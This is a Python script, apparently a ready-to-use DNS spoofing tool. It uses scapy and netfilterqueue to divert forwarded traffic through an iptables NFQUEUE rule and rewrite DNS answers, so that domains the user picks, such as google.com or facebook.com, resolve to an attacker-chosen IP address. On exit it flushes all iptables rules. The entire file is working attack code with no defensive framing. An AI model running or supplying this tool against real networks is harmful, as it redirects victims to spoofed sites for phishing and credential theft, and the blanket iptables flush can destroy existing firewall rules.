from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

print("[1]example ip address 192.168.1.112")
print ("[2]example domain name for spoofing google.com")
asdf = """
[3]host domain spoof for example  facebook.com
[4]hostdomain ip address for example ip facebook is 172.217.19.142
"""

host_type1 = input("[1]type your ip address ipv4 local:>")
domain_name = input("[2]type your domain name for spoofing:>")
host_ip = input("[3]type your domain address spoof :>")
host_domain = input("[4] type your ip address domain name :>")


dns_hosts = {
    "www."+domain_name+".": host_type1,
    domain_name +".": host_type1,
    host_domain + ".": host_ip
}

def process_packet(packet):

    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):

    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

QUEUE_NUM = 0
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = NetfilterQueue()

try:
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    